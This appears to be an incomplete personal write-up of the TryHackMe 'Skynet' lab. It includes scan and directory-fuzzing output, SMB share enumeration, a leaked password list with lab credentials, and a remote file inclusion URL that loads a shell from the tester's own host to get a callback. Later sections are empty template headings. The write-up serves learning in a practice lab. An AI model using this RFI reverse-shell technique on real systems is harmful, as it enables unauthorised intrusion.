---
creation date: July 18th 2023
last modified date: July 18th 2023
aliases: []
tags: #🎌
---

Primary Categories: 
Secondary Categories:  
Links: 
Search Tag: #🎌  

# [[THM - Skynet]]  


# Resolution summary
- Text
- Text

## Improved skills
- skill 1
- skill 2

## Used tools
- [[nmap]]
- 

---

# Information Gathering
Scanned all TCP ports:
```bash
22/tcp  open  ssh
80/tcp  open  http
110/tcp open  pop3
139/tcp open  netbios-ssn
143/tcp open  imap
445/tcp open  microsoft-ds
```

Enumerated open TCP ports:
```bash
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA)
|   256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)
|_  256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (ED25519)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Skynet
|_http-server-header: Apache/2.4.18 (Ubuntu)
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: TOP UIDL PIPELINING CAPA SASL RESP-CODES AUTH-RESP-CODE
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: LOGINDISABLEDA0001 Pre-login LOGIN-REFERRALS listed more ENABLE have IDLE post-login ID IMAP4rev1 SASL-IR OK LITERAL+ capabilities
445/tcp open  0�6[U      Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: skynet
|   NetBIOS computer name: SKYNET\x00
|   Domain name: \x00
|   FQDN: skynet
|_  System time: 2023-07-18T18:23:36-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2023-07-18T23:23:36
|_  start_date: N/A
|_nbstat: NetBIOS name: SKYNET, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_clock-skew: mean: 1h40m00s, deviation: 2h53m12s, median: 0s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
```

Enumerated top 200 UDP ports:
```bash

```

---

# Enumeration
## Port 80
Enumerated directories:
```
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.120.81/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

[Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 186ms]
    * FUZZ: admin

[INFO] Adding a new job to the queue: http://10.10.120.81/admin/FUZZ

[Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 186ms]
    * FUZZ: css

[INFO] Adding a new job to the queue: http://10.10.120.81/css/FUZZ

[Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 189ms]
    * FUZZ: js

[INFO] Adding a new job to the queue: http://10.10.120.81/js/FUZZ

[Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 186ms]
    * FUZZ: config

[INFO] Adding a new job to the queue: http://10.10.120.81/config/FUZZ

[Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 186ms]
    * FUZZ: ai

[INFO] Adding a new job to the queue: http://10.10.120.81/ai/FUZZ

[Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 305ms]
    * FUZZ: squirrelmail

[INFO] Adding a new job to the queue: http://10.10.120.81/squirrelmail/FUZZ

```

- Checked all and only `/squirrelmail` gave me access
![[Pasted image 20230718182920.png]]
- Located a password list on anonymous share on SMB and used it against *milesdyson*
	- Pass located: *cyborg007haloterminator*
- This email contained three emails:
1. 
```
We have changed your smb password after system malfunction.
Password: )s{A&2Z=F^n_E.B`
```
2. 
```
01100010 01100001 01101100 01101100 01110011 00100000 01101000 01100001 01110110
01100101 00100000 01111010 01100101 01110010 01101111 00100000 01110100 01101111
00100000 01101101 01100101 00100000 01110100 01101111 00100000 01101101 01100101
00100000 01110100 01101111 00100000 01101101 01100101 00100000 01110100 01101111
00100000 01101101 01100101 00100000 01110100 01101111 00100000 01101101 01100101
00100000 01110100 01101111 00100000 01101101 01100101 00100000 01110100 01101111
00100000 01101101 01100101 00100000 01110100 01101111 00100000 01101101 01100101
00100000 01110100 01101111
```
3. 
```
i can i i everything else . . . . . . . . . . . . . .
balls have zero to me to me to me to me to me to me to me to me to
you i everything else . . . . . . . . . . . . . .
balls have a ball to me to me to me to me to me to me to me
i i can i i i everything else . . . . . . . . . . . . . .
balls have a ball to me to me to me to me to me to me to me
i . . . . . . . . . . . . . . . . . . .
balls have zero to me to me to me to me to me to me to me to me to
you i i i i i everything else . . . . . . . . . . . . . .
balls have 0 to me to me to me to me to me to me to me to me to
you i i i everything else . . . . . . . . . . . . . .
balls have zero to me to me to me to me to me to me to me to me to
```

## Port 445
Enumerated Shares:
```bash
└─$ smbclient -N -L //<IP>

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	anonymous       Disk      Skynet Anonymous Share
	milesdyson      Disk      Miles Dyson Personal Share
	IPC$            IPC       IPC Service (skynet server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	WORKGROUP            SKYNET

```

### Pulled all files from *anonymous* share:![[SMBClient#Downloading an entire share]]
- attention.txt
```
A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
-Miles Dyson
```
- log1.txt
```
cyborg007haloterminator
terminator22596
terminator219
terminator20
terminator1989
terminator1988
terminator168
terminator16
terminator143
terminator13
terminator123!@#
terminator1056
terminator101
terminator10
terminator02
terminator00
roboterminator
pongterminator
manasturcaluterminator
exterminator95
exterminator200
dterminator
djxterminator
dexterminator
determinator
cyborg007haloterminator
avsterminator
alonsoterminator
Walterminator
79terminator6
1996terminator
```
- log2.txt
	- Empty
- log3.txt
	- Empty

### Pulled all files from *milesdyson* share:

---

# Exploitation
## Remote File Inclusion
- Located a hidden directory from the milesdyson share after enumerating that with [[ffuf]] it leads to `/adminstrator` sub-directory.
- The directory showed they are using a CMS that is exploitable via both LFI and RFI
- Used the RFI to upload and run a shell which called back to us and got us in
```URL
http://10.10.120.81/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.13.0.100:3000/shell.php5?
```


---

# Lateral Movement to user
## Local Enumeration


## Lateral Movement vector


---

# Privilege Escalation
## Local Enumeration


## Privilege Escalation vector


---

# Trophy & Loot

___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: July 18th 2023 (06:05 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
